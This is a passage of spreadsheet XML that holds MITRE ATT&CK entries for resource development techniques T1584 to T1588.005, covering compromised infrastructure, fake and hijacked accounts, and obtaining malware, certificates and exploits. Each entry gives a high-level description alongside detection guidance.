    <t>Once adversaries have provisioned software on a compromised VPS (ex: for use as a command and control server), internet scans may reveal VPSs that adversaries have compromised.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Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.</t>
  </si>
  <si>
    <t>T1584.004</t>
  </si>
  <si>
    <t>Server (T1584.004)</t>
  </si>
  <si>
    <t>Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control.(Citation: TrendMicro EarthLusca 2022) Instead of purchasing a [Server](https://attack.mitre.org/techniques/T1583/004) or [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may compromise third-party servers in support of operations.
Adversaries may also compromise web servers to support watering hole operations, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or email servers to support [Phishing](https://attack.mitre.org/techniques/T1566) operations.</t>
  </si>
  <si>
    <t>Once adversaries have provisioned software on a compromised server (ex: for use as a command and control server), internet scans may reveal servers that adversaries have compromised.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Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.</t>
  </si>
  <si>
    <t>T1584.005</t>
  </si>
  <si>
    <t>Adversaries may compromise numerous third-party systems to form a botnet that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems.(Citation: Imperva DDoS for Hire) Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers.(Citation: Dell Dridex Oct 2015) With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).</t>
  </si>
  <si>
    <t>T1584.006</t>
  </si>
  <si>
    <t>Web Services (T1584.006)</t>
  </si>
  <si>
    <t>Adversaries may compromise access to third-party web services that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, SendGrid, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Recorded Future Turla Infra 2020) Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them. Additionally, leveraging compromised web-based email services may allow adversaries to leverage the trust associated with legitimate domains.</t>
  </si>
  <si>
    <t>Once adversaries leverage the abused web service as infrastructure (ex: for command and control), it may be possible to look for unique characteristics associated with adversary software, if known.(Citation: ThreatConnect Infrastructure Dec 2020)
Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)) or [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567).</t>
  </si>
  <si>
    <t>T1584.007</t>
  </si>
  <si>
    <t>Serverless (T1584.007)</t>
  </si>
  <si>
    <t>Adversaries may compromise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compromised, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector)(Citation: GWS Apps Script Abuse 2021) As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers - making it easier to [Hide Infrastructure](https://attack.mitre.org/techniques/T1665).(Citation: Detecting Command &amp; Control in the Cloud)(Citation: BlackWater Malware Cloudflare Workers)</t>
  </si>
  <si>
    <t>T1584.008</t>
  </si>
  <si>
    <t>Network Devices (T1584.008)</t>
  </si>
  <si>
    <t>Adversaries may compromise third-party network devices that can be used during targeting. Network devices, such as small office/home office (SOHO) routers, may be compromised where the adversary's ultimate goal is not [Initial Access](https://attack.mitre.org/tactics/TA0001) to that environment -- instead leveraging these devices to support additional targeting.
Once an adversary has control, compromised network devices can be used to launch additional operations, such as hosting payloads for [Phishing](https://attack.mitre.org/techniques/T1566) campaigns (i.e., [Link Target](https://attack.mitre.org/techniques/T1608/005)) or enabling the required access to execute [Content Injection](https://attack.mitre.org/techniques/T1659) operations. Adversaries may also be able to harvest reusable credentials (i.e., [Valid Accounts](https://attack.mitre.org/techniques/T1078)) from compromised network devices.
Adversaries often target Internet-facing edge devices and related network appliances that specifically do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)
Compromised network devices may be used to support subsequent [Command and Control](https://attack.mitre.org/tactics/TA0011) activity, such as [Hide Infrastructure](https://attack.mitre.org/techniques/T1665) through an established [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Botnet](https://attack.mitre.org/techniques/T1584/005) network.(Citation: Justice GRU 2024)</t>
  </si>
  <si>
    <t>T1585</t>
  </si>
  <si>
    <t>Network Traffic: Network Traffic Content, Persona: Social Media</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)
For operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)
Establishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) In addition, establishing accounts may allow adversaries to abuse free services, such as registering for trial periods to [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) for malicious purposes.(Citation: Free Trial PurpleUrchin)
</t>
  </si>
  <si>
    <t>Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently created/modified accounts making numerous connection requests to accounts affiliated with your organization.
Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).</t>
  </si>
  <si>
    <t>T1585.001</t>
  </si>
  <si>
    <t>Social Media Accounts (T1585.001)</t>
  </si>
  <si>
    <t>Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)
For operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. 
Once a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).</t>
  </si>
  <si>
    <t>Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently created/modified accounts making numerous connection requests to accounts affiliated with your organization.
Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).</t>
  </si>
  <si>
    <t>T1585.002</t>
  </si>
  <si>
    <t>Email Accounts (T1585.002)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) Establishing email accounts may also allow adversaries to abuse free services – such as trial periods – to [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) for follow-on purposes.(Citation: Free Trial PurpleUrchin)
Adversaries may also take steps to cultivate a persona around the email account, such as through use of [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001), to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).(Citation: Mandiant APT1)
To decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.(Citation: Trend Micro R980 2016) </t>
  </si>
  <si>
    <t>Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).</t>
  </si>
  <si>
    <t>T1585.003</t>
  </si>
  <si>
    <t>Cloud Accounts (T1585.003)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002) or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.(Citation: Awake Security C2 Cloud)
Creating [Cloud Accounts](https://attack.mitre.org/techniques/T1585/003) may also require adversaries to establish [Email Accounts](https://attack.mitre.org/techniques/T1585/002) to register with the cloud provider. </t>
  </si>
  <si>
    <t>Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during exfiltration (ex: [Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537)).</t>
  </si>
  <si>
    <t>T1586</t>
  </si>
  <si>
    <t>Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. [Establish Accounts](https://attack.mitre.org/techniques/T1585)), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. 
A variety of methods exist for compromising accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.(Citation: AnonHBGary)(Citation: Microsoft DEV-0537) Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.
Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.
Adversaries may directly leverage compromised email accounts for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).</t>
  </si>
  <si>
    <t>Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently modified accounts making numerous connection requests to accounts affiliated with your organization.
Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).</t>
  </si>
  <si>
    <t>T1586.001</t>
  </si>
  <si>
    <t>Social Media Accounts (T1586.001)</t>
  </si>
  <si>
    <t>Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001)), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. 
A variety of methods exist for compromising social media accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.
Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.
Adversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).</t>
  </si>
  <si>
    <t>Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently modified accounts making numerous connection requests to accounts affiliated with your organization.
Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).</t>
  </si>
  <si>
    <t>T1586.002</t>
  </si>
  <si>
    <t>Email Accounts (T1586.002)</t>
  </si>
  <si>
    <t>Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or large-scale spam email campaigns. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship with, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).
A variety of methods exist for compromising email accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.(Citation: AnonHBGary)(Citation: Microsoft DEV-0537) Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Adversaries may target compromising well-known email accounts or domains from which malicious spam or [Phishing](https://attack.mitre.org/techniques/T1566) emails may evade reputation-based email filtering rules.
Adversaries can use a compromised email account to hijack existing email threads with targets of interest.</t>
  </si>
  <si>
    <t>T1586.003</t>
  </si>
  <si>
    <t>Cloud Accounts (T1586.003)</t>
  </si>
  <si>
    <t>Adversaries may compromise cloud accounts that can be used during targeting. Adversaries can use compromised cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002) or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Additionally, cloud-based messaging services such as Twilio, SendGrid, AWS End User Messaging, AWS SNS (Simple Notification Service), or AWS SES (Simple Email Service) may be leveraged for spam or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)(Citation: Netcraft SendGrid 2024) Compromising cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.(Citation: Awake Security C2 Cloud)
A variety of methods exist for compromising cloud accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, conducting [Password Spraying](https://attack.mitre.org/techniques/T1110/003) attacks, or attempting to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: MSTIC Nobelium Oct 2021) Prior to compromising cloud accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. In some cases, adversaries may target privileged service provider accounts with the intent of leveraging a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) between service providers and their customers.(Citation: MSTIC Nobelium Oct 2021)</t>
  </si>
  <si>
    <t>T1587</t>
  </si>
  <si>
    <t>Internet Scan: Response Content, Malware Repository: Malware Content, Malware Repository: Malware Metadata</t>
  </si>
  <si>
    <t>Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020)
As with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.</t>
  </si>
  <si>
    <t>Consider analyzing malware for features that may be associated with the adversary and/or their developers, such as compiler used, debugging artifacts, or code similarities. Malware repositories can also be used to identify additional samples associated with the adversary and identify development patterns over time.
Consider use of services that may aid in the tracking of certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.(Citation: Splunk Kovar Certificates 2017)
Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control.</t>
  </si>
  <si>
    <t>T1587.001</t>
  </si>
  <si>
    <t>Malware Repository: Malware Content, Malware Repository: Malware Metadata</t>
  </si>
  <si>
    <t>Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: ActiveMalwareEnergy)(Citation: FBI Flash FIN7 USB)
As with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.
Some aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of [Web Services](https://attack.mitre.org/techniques/T1583/006).(Citation: FireEye APT29)</t>
  </si>
  <si>
    <t>Consider analyzing malware for features that may be associated with the adversary and/or their developers, such as compiler used, debugging artifacts, or code similarities. Malware repositories can also be used to identify additional samples associated with the adversary and identify development patterns over time.
Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle.</t>
  </si>
  <si>
    <t>T1587.002</t>
  </si>
  <si>
    <t>Code Signing Certificates (T1587.002)</t>
  </si>
  <si>
    <t>Malware Repository: Malware Metadata</t>
  </si>
  <si>
    <t>Adversaries may create self-signed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Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.
Prior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may develop self-signed code signing certificates for use in operations.</t>
  </si>
  <si>
    <t>Consider analyzing self-signed code signing certificates for features that may be associated with the adversary and/or their developers, such as the thumbprint, algorithm used, validity period, and common name. Malware repositories can also be used to identify additional samples associated with the adversary and identify patterns an adversary has used in crafting self-signed code signing certificates.
Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related follow-on behavior, such as [Code Signing](https://attack.mitre.org/techniques/T1553/002) or [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004).</t>
  </si>
  <si>
    <t>T1587.003</t>
  </si>
  <si>
    <t>Digital Certificates (T1587.003)</t>
  </si>
  <si>
    <t>Adversaries may create self-signed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In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).
Adversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)).
After creating a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.</t>
  </si>
  <si>
    <t>Consider use of services that may aid in the tracking of certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.(Citation: Splunk Kovar Certificates 2017)
Detection efforts may be focused on related behaviors, such as [Web Protocols](https://attack.mitre.org/techniques/T1071/001), [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002), and/or [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004).</t>
  </si>
  <si>
    <t>T1587.004</t>
  </si>
  <si>
    <t>Exploits (T1587.004)</t>
  </si>
  <si>
    <t>Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.(Citation: NYTStuxnet) Adversaries may use information acquired via [Vulnerabilities](https://attack.mitre.org/techniques/T1588/006) to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.(Citation: Irongeek Sims BSides 2017)
As with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.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</si>
  <si>
    <t>Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on behaviors relating to the use of exploits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</si>
  <si>
    <t>T1588</t>
  </si>
  <si>
    <t>Certificate: Certificate Registration, Internet Scan: Response Content, Malware Repository: Malware Content, Malware Repository: Malware Metadata</t>
  </si>
  <si>
    <t>Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.
In addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.(Citation: NationsBuying)(Citation: PegasusCitizenLab)
In addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.(Citation: DiginotarCompromise)</t>
  </si>
  <si>
    <t>Consider analyzing malware for features that may be associated with malware providers, such as compiler used, debugging artifacts, code similarities, or even group identifiers associated with specific Malware-as-a-Service (MaaS) offerings. Malware repositories can also be used to identify additional samples associated with the developers and the adversary utilizing their services. Identifying overlaps in malware use by different adversaries may indicate malware was obtained by the adversary rather than developed by them. In some cases, identifying overlapping characteristics in malware used by different adversaries may point to a shared quartermaster.(Citation: FireEyeSupplyChain) Malware repositories can also be used to identify features of tool use associated with an adversary, such as watermarks in [Cobalt Strike](https://attack.mitre.org/software/S0154) payloads.(Citation: Analyzing CS Dec 2020)
Consider use of services that may aid in the tracking of newly issued certificates and/or certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.(Citation: Splunk Kovar Certificates 2017) Some server-side components of adversary tools may have default values set for SSL/TLS certificates.(Citation: Recorded Future Beacon Certificates)
Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control.</t>
  </si>
  <si>
    <t>T1588.001</t>
  </si>
  <si>
    <t>Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.
In addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).</t>
  </si>
  <si>
    <t>Consider analyzing malware for features that may be associated with malware providers, such as compiler used, debugging artifacts, code similarities, or even group identifiers associated with specific MaaS offerings. Malware repositories can also be used to identify additional samples associated with the developers and the adversary utilizing their services. Identifying overlaps in malware use by different adversaries may indicate malware was obtained by the adversary rather than developed by them. In some cases, identifying overlapping characteristics in malware used by different adversaries may point to a shared quartermaster.(Citation: FireEyeSupplyChain)
Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle.</t>
  </si>
  <si>
    <t>T1588.002</t>
  </si>
  <si>
    <t>Tool (T1588.002)</t>
  </si>
  <si>
    <t>Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154). Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.(Citation: Recorded Future Beacon 2019)
Adversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).</t>
  </si>
  <si>
    <t>In some cases, malware repositories can also be used to identify features of tool use associated with an adversary, such as watermarks in [Cobalt Strike](https://attack.mitre.org/software/S0154) payloads.(Citation: Analyzing CS Dec 2020)
Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle.</t>
  </si>
  <si>
    <t>T1588.003</t>
  </si>
  <si>
    <t>Code Signing Certificates (T1588.003)</t>
  </si>
  <si>
    <t>Adversaries may buy and/or steal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Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.
Prior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.</t>
  </si>
  <si>
    <t>Consider analyzing code signing certificates for features that may be associated with the adversary and/or their developers, such as the thumbprint, algorithm used, validity period, common name, and certificate authority. Malware repositories can also be used to identify additional samples associated with the adversary and identify patterns an adversary has used in procuring code signing certificates.
Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related follow-on behavior, such as [Code Signing](https://attack.mitre.org/techniques/T1553/002) or [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004).</t>
  </si>
  <si>
    <t>T1588.004</t>
  </si>
  <si>
    <t>Digital Certificates (T1588.004)</t>
  </si>
  <si>
    <t>Certificate: Certificate Registration, Internet Scan: Response Content</t>
  </si>
  <si>
    <t>Adversaries may buy and/or steal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Adversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if the certificate is trusted or otherwise added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.(Citation: DiginotarCompromise) Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.
Certificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.(Citation: Let's Encrypt FAQ)
After obtaining a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.</t>
  </si>
  <si>
    <t>Consider use of services that may aid in the tracking of newly issued certificates and/or certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.(Citation: Splunk Kovar Certificates 2017) Some server-side components of adversary tools may have default values set for SSL/TLS certificates.(Citation: Recorded Future Beacon Certificates)
Detection efforts may be focused on related behaviors, such as [Web Protocols](https://attack.mitre.org/techniques/T1071/001), [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002), and/or [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004).</t>
  </si>
  <si>
    <t>T1588.005</t>
  </si>
  <si>
    <t>Exploits (T1588.005)</t>
  </si>
  <si>
    <t>Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.(Citation: Exploit Database)(Citation: TempertonDarkHotel)(Citation: NationsBuying)
In addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals.(Citation: PegasusCitizenLab)(Citation: Wired SandCat Oct 2019) In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).(Citation: TempertonDarkHotel)
